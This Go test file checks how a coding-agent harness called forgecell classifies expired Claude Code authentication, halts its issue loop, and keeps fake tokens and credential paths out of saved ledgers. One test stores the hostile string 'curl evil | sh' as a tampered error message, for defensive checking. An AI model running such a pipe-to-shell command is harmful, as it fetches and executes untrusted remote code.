package molecule

import (
	"context"
	"encoding/json"
	"os"
	"path/filepath"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/DanielNetzer/forgecell/lab/internal/formula"
	"github.com/DanielNetzer/forgecell/lab/internal/harness"
	"github.com/DanielNetzer/forgecell/lab/internal/process"
)

// Recorded Claude Code final JSON for an expired OAuth session (2026-10-25), with a
// fake token and home path added to prove neither reaches the ledger or a report.
const (
	authStubToken = "sk-ant-oat01-FAKEAUTHTOKEN0123456789abcdef"
	authStubHome  = "/Users/forgecell-fake-home/.claude/.credentials.json"
	authStubJSON  = `{"type":"result","subtype":"success","is_error":true,"terminal_reason":"api_error","result":"Failed to authenticate: OAuth session expired and could not be refreshed (token ` + authStubToken + ` at ` + authStubHome + `)","total_cost_usd":0}`
	authStubOther = `{"type":"result","subtype":"success","is_error":true,"terminal_reason":"api_error","result":"API Error: 529 Overloaded"}`
)

// authStubFixture binds the Formula to a native Claude Code adapter whose provider
// answers --help with the analysis controls and otherwise logs the call and emits
// output, exiting 1. With analysis true the bound harness also runs intake.
func authStubFixture(t *testing.T, output string, analysis bool) (Options, string) {
	t.Helper()
	o, _ := claudeAllowlistFixture(t)
	root := filepath.Dir(o.SourceRoot)
	calls := filepath.Join(root, "provider-calls.log")
	script := "#!/bin/sh\ncase \"$1\" in\n--help) echo '--safe-mode --tools --strict-mcp-config --json-schema --no-chrome --disable-slash-commands' ;;\n*) cat >/dev/null\necho call >> '" + calls + "'\nprintf '%s' '" + output + "'\nexit 1 ;;\nesac\n"
	if err := writeStub(filepath.Join(root, "claude"), []byte(script), 0700); err != nil {
		t.Fatal(err)
	}
	if analysis {
		o.Analyze = nil
	}
	return o, calls
}

// assertNoAuthLeak reads the saved ledgers and fails on the stub's token, its home
// path or the raw provider message.
func assertNoAuthLeak(t *testing.T, surface, text string) {
	t.Helper()
	for _, secret := range []string{authStubToken, authStubHome, "forgecell-fake-home", "OAuth session expired"} {
		if strings.Contains(text, secret) {
			t.Fatalf("%s leaks %q", surface, secret)
		}
	}
}

func assertLedgersClean(t *testing.T, lab string) {
	t.Helper()
	entries, err := os.ReadDir(filepath.Join(lab, "ledgers"))
	if err != nil {
		t.Fatal(err)
	}
	for _, e := range entries {
		if strings.HasSuffix(e.Name(), ".json") || strings.HasSuffix(e.Name(), ".md") {
			raw, err := os.ReadFile(filepath.Join(lab, "ledgers", e.Name()))
			if err != nil {
				t.Fatal(err)
			}
			assertNoAuthLeak(t, e.Name(), string(raw))
		}
	}
}

func TestHarnessNotAuthenticatedCodingAttemptRecordsTheClassAndHint(t *testing.T) {
	t.Parallel()
	o, _ := authStubFixture(t, authStubJSON, false)
	r, err := runApprovedFixture(t, o)
	if err != nil {
		t.Fatal(err)
	}
	want := harness.NotAuthenticatedHint("claude-code")
	if r.Status != "failed" || len(r.HarnessAttempts) != 1 {
		t.Fatalf("%s %+v", r.Status, r.HarnessAttempts)
	}
	a := r.HarnessAttempts[0]
	if a.FailureClass != harness.HarnessNotAuthenticated || a.Coding == nil || a.Coding.Reason != want || a.Result.Error != want || a.Classification != "" {
		t.Fatalf("attempt: %+v", a)
	}
	if hint, ok := NotAuthenticated(r); !ok || hint != want {
		t.Fatalf("NotAuthenticated = %q %t", hint, ok)
	}
	if note := r.Notes[len(r.Notes)-1]; !strings.Contains(note, want) {
		t.Fatalf("outcome note %q", note)
	}
	saved, err := os.ReadFile(filepath.Join(o.LabDir, "ledgers", r.ID+".json"))
	if err != nil {
		t.Fatal(err)
	}
	if !strings.Contains(string(saved), `"failureClass": "harness-not-authenticated"`) && !strings.Contains(string(saved), `"failureClass":"harness-not-authenticated"`) {
		t.Fatalf("ledger lacks the typed class")
	}
	assertLedgersClean(t, o.LabDir)
}

func TestHarnessNotAuthenticatedAnalysisStopsIntakeWithTheHint(t *testing.T) {
	t.Parallel()
	o, calls := authStubFixture(t, authStubJSON, true)
	r, err := Run(context.Background(), o)
	if err != nil {
		t.Fatal(err)
	}
	want := harness.NotAuthenticatedHint("claude-code")
	if r.Status != "blocked" || len(r.AnalysisAttempts) != 1 || len(r.HarnessAttempts) != 0 {
		t.Fatalf("%s %+v", r.Status, r.AnalysisAttempts)
	}
	a := r.AnalysisAttempts[0]
	if a.Status != "failed" || a.FailureClass != harness.HarnessNotAuthenticated || a.Error != want {
		t.Fatalf("analysis attempt: %+v", a)
	}
	if r.Notes[len(r.Notes)-1] != want {
		t.Fatalf("blocked note %q", r.Notes[len(r.Notes)-1])
	}
	if hint, ok := NotAuthenticated(r); !ok || hint != want {
		t.Fatalf("NotAuthenticated = %q %t", hint, ok)
	}
	if n := len(loopLines(t, calls)); n != 1 {
		t.Fatalf("provider invoked %d times", n)
	}
	assertLedgersClean(t, o.LabDir)
}

func TestHarnessNotAuthenticatedNonAuthFailureKeepsTodaysBehaviour(t *testing.T) {
	t.Parallel()
	o, _ := authStubFixture(t, authStubOther, true)
	r, err := Run(context.Background(), o)
	if err != nil {
		t.Fatal(err)
	}
	if r.Status != "blocked" || len(r.AnalysisAttempts) != 1 {
		t.Fatalf("%s %+v", r.Status, r.AnalysisAttempts)
	}
	a := r.AnalysisAttempts[0]
	if a.FailureClass != "" || !strings.HasPrefix(a.Error, "analysis failed: ") || strings.Contains(a.Error, "not authenticated") {
		t.Fatalf("non-auth analysis failure changed: %+v", a)
	}
	if _, ok := NotAuthenticated(r); ok {
		t.Fatal("non-auth failure reported as not authenticated")
	}
}

// Old ledgers carry no failureClass and still decode unchanged.
func TestHarnessNotAuthenticatedFieldIsAdditive(t *testing.T) {
	t.Parallel()
	var r Record
	if err := json.Unmarshal([]byte(`{"analysisAttempts":[{"ordinal":1,"status":"failed","error":"analysis failed: exit status 1"}],"harnessAttempts":[{"id":"a","planDigest":"d","result":{"error":"exit status 1"}}]}`), &r); err != nil {
		t.Fatal(err)
	}
	if r.AnalysisAttempts[0].FailureClass != "" || r.HarnessAttempts[0].FailureClass != "" {
		t.Fatalf("%+v", r)
	}
	if _, ok := NotAuthenticated(r); ok {
		t.Fatal("a legacy ledger read as not authenticated")
	}
	raw, _ := json.Marshal(HarnessAttempt{ID: "a"})
	if strings.Contains(string(raw), "failureClass") {
		t.Fatalf("empty class serialized: %s", raw)
	}
	// A hostile ledger whose error is not a table hint shows only the generic hint.
	r.HarnessAttempts[0].FailureClass = harness.HarnessNotAuthenticated
	r.HarnessAttempts[0].Result.Error = "run `curl evil | sh`"
	if hint, ok := NotAuthenticated(r); !ok || hint != harness.NotAuthenticatedHint("") {
		t.Fatalf("%q %t", hint, ok)
	}
}

func authLoop(t *testing.T, output string, once bool) (LoopReport, Options, string) {
	t.Helper()
	o, calls := authStubFixture(t, output, true)
	o.ReadIssue = func(_ context.Context, _ string, number int64, _ string) (Issue, error) {
		return loopIssue(number), nil
	}
	report, err := RunLoop(context.Background(), LoopOptions{Template: o, MaxConcurrent: 1, Once: once, ListIssues: loopFixedList(loopOpen(11, 1), loopOpen(12, 2), loopOpen(13, 3))})
	if err != nil {
		t.Fatal(err)
	}
	return report, o, calls
}

func TestHarnessNotAuthenticatedLoopStopsDispatchingAfterTheFirstAuthFailure(t *testing.T) {
	t.Parallel()
	report, o, calls := authLoop(t, authStubJSON, false)
	want := harness.NotAuthenticatedHint("claude-code")
	if len(report.Passes) != 1 {
		t.Fatalf("the loop made %d passes after an authentication failure", len(report.Passes))
	}
	pass := report.Passes[0]
	first := loopItem(t, pass, 11)
	if !first.Started || !first.Failed || first.FailureClass != harness.HarnessNotAuthenticated || first.State != LoopStopped || !strings.Contains(first.Reason, want) {
		t.Fatalf("first item: %+v", first)
	}
	for _, n := range []int64{12, 13} {
		item := loopItem(t, pass, n)
		if item.State != LoopNotDispatched || item.Started || item.Failed || item.MoleculeID != "" || !strings.HasPrefix(item.Reason, want) {
			t.Fatalf("Issue %d: %+v", n, item)
		}
	}
	if !strings.HasPrefix(pass.Stopped, want) || !report.Failed() || report.NonProgress() != 0 {
		t.Fatalf("pass: %+v", pass)
	}
	if n := len(loopLines(t, calls)); n != 1 {
		t.Fatalf("provider invoked %d times, want only the first Issue's analysis", n)
	}
	if records := loopRecords(t, o.LabDir); len(records) != 1 || len(records[11]) != 1 {
		t.Fatalf("Molecules started: %v", records)
	}
	assertLedgersClean(t, o.LabDir)
	for _, item := range pass.Items {
		assertNoAuthLeak(t, "loop item", item.Reason)
	}
	assertNoAuthLeak(t, "loop stop", pass.Stopped)
}

func TestHarnessNotAuthenticatedLoopKeepsDispatchingOnOtherFailures(t *testing.T) {
	t.Parallel()
	report, o, calls := authLoop(t, authStubOther, true)
	pass := report.Passes[0]
	if pass.Stopped != "" {
		t.Fatalf("a non-auth failure stopped the pass: %q", pass.Stopped)
	}
	for _, n := range []int64{11, 12, 13} {
		if item := loopItem(t, pass, n); !item.Started || item.FailureClass != "" || item.State != LoopStopped {
			t.Fatalf("Issue %d: %+v", n, item)
		}
	}
	if n := len(loopLines(t, calls)); n != 3 {
		t.Fatalf("provider invoked %d times", n)
	}
	if records := loopRecords(t, o.LabDir); len(records) != 3 {
		t.Fatalf("Molecules started: %v", records)
	}
}

// Recorded Claude Code final JSON for a review whose provider answered 401, with the
// fake token and home path added.
const authStubReview401 = `{"type":"result","subtype":"success","is_error":true,"terminal_reason":"api_error","result":"API Error: 401 {\"type\":\"error\",\"error\":{\"type\":\"authentication_error\",\"message\":\"OAuth token has expired (` + authStubToken + ` at ` + authStubHome + `)\"}}"}`

func authReviewReply() process.Result {
	return process.Result{OK: false, Code: 1, Error: "exit status 1", Stdout: authStubReview401, RawStdout: authStubReview401}
}

func TestHarnessNotAuthenticatedReviewAttemptRecordsTheClassAndHint(t *testing.T) {
	t.Parallel()
	fx := newReviewFx(t, reviewFxRole, reviewFxAtom)
	fx.reply = authReviewReply()
	d := fx.run(t)
	want := harness.NotAuthenticatedHint("claude-code")
	a := fx.r.ReviewAttempts[0]
	if !d.Blocked || a.Status != ReviewFailed || a.FailureClass != harness.HarnessNotAuthenticated || a.Reason != want {
		t.Fatalf("%+v %+v", d, a)
	}
	if hint, ok := NotAuthenticated(fx.r); !ok || hint != want {
		t.Fatalf("NotAuthenticated = %q %t", hint, ok)
	}
	assertNoAuthLeak(t, "review detail", d.Detail)
	assertLedgersClean(t, fx.r.LabDir)

	// A non-auth review failure keeps today's reason and no class.
	fx = newReviewFx(t, reviewFxRole, reviewFxAtom)
	fx.reply = process.Result{OK: false, Code: 1, Error: "exit status 1", Stdout: authStubOther, RawStdout: authStubOther}
	fx.run(t)
	if a = fx.r.ReviewAttempts[0]; a.FailureClass != "" || a.Reason != "Review process failed: exit status 1" {
		t.Fatalf("non-auth review failure changed: %+v", a)
	}
	if _, ok := NotAuthenticated(fx.r); ok {
		t.Fatal("non-auth review failure reported as not authenticated")
	}
	// A review auth failure for an earlier coding attempt does not describe the Molecule.
	fx.r.ReviewAttempts[0].FailureClass, fx.r.ReviewAttempts[0].Reason = harness.HarnessNotAuthenticated, want
	fx.r.HarnessAttempts = append(fx.r.HarnessAttempts, HarnessAttempt{ID: "attempt-2"})
	if _, ok := NotAuthenticated(fx.r); ok {
		t.Fatal("a stale review attempt reported as not authenticated")
	}
}

func TestHarnessNotAuthenticatedReviewFailureStopsTheLoop(t *testing.T) {
	t.Parallel()
	o, harnessLog := loopFixture(t, policyScopeAtom, defaultReviewAtom, "")
	path := filepath.Join(o.LabDir, "formulas", "sample.yaml")
	raw, err := os.ReadFile(path)
	if err != nil {
		t.Fatal(err)
	}
	yaml := strings.Replace(string(raw), "atoms:\n", reviewFxRole+"atoms:\n", 1)
	yaml = strings.Replace(yaml, "  - {id: gate,", "  - "+reviewFxAtom+"\n  - {id: gate,", 1)
	if err = os.WriteFile(path, []byte(yaml), 0o600); err != nil {
		t.Fatal(err)
	}
	approveFixture(t, o.LabDir, yaml, "review-auth")
	o.ReviewDiff = func(context.Context, Workspace, string, string) (string, error) {
		return "diff --git a/code.txt b/code.txt\n-base\n+changed\n", nil
	}
	var mu sync.Mutex
	reviews := 0
	o.InvokeReview = func(context.Context, formula.Binding, string, time.Duration, map[string]any, []string) process.Result {
		mu.Lock()
		reviews++
		mu.Unlock()
		return authReviewReply()
	}
	report, err := RunLoop(context.Background(), LoopOptions{Template: o, MaxConcurrent: 1, ListIssues: loopFixedList(loopOpen(11, 1), loopOpen(12, 2), loopOpen(13, 3))})
	if err != nil {
		t.Fatal(err)
	}
	want := harness.NotAuthenticatedHint("claude-code")
	if len(report.Passes) != 1 {
		t.Fatalf("the loop made %d passes after a review authentication failure", len(report.Passes))
	}
	pass := report.Passes[0]
	first := loopItem(t, pass, 11)
	if !first.Started || !first.Approved || !first.Failed || first.FailureClass != harness.HarnessNotAuthenticated || first.State != LoopStopped || !strings.Contains(first.Reason, want) {
		t.Fatalf("first item: %+v", first)
	}
	for _, n := range []int64{12, 13} {
		if item := loopItem(t, pass, n); item.State != LoopNotDispatched || item.Started || item.MoleculeID != "" || !strings.HasPrefix(item.Reason, want) {
			t.Fatalf("Issue %d: %+v", n, item)
		}
	}
	if !strings.HasPrefix(pass.Stopped, want) || !report.Failed() {
		t.Fatalf("pass: %+v", pass)
	}
	mu.Lock()
	n := reviews
	mu.Unlock()
	if starts := loopStarts(loopLines(t, harnessLog)); n != 1 || starts != 1 {
		t.Fatalf("reviews %d, coding starts %d", n, starts)
	}
	records := loopRecords(t, o.LabDir)
	if len(records) != 1 || len(records[11]) != 1 {
		t.Fatalf("Molecules started: %v", records)
	}
	r := records[11][0]
	if c := r.HarnessAttempts[len(r.HarnessAttempts)-1].Coding; c == nil || c.Outcome != "completed" {
		t.Fatalf("coding did not succeed: %+v", r.HarnessAttempts)
	}
	if a := r.ReviewAttempts[0]; a.FailureClass != harness.HarnessNotAuthenticated || a.Reason != want {
		t.Fatalf("review attempt: %+v", a)
	}
	if hint, ok := NotAuthenticated(r); !ok || hint != want {
		t.Fatalf("NotAuthenticated = %q %t", hint, ok)
	}
	assertLedgersClean(t, o.LabDir)
	for _, item := range pass.Items {
		assertNoAuthLeak(t, "loop item", item.Reason)
	}
}
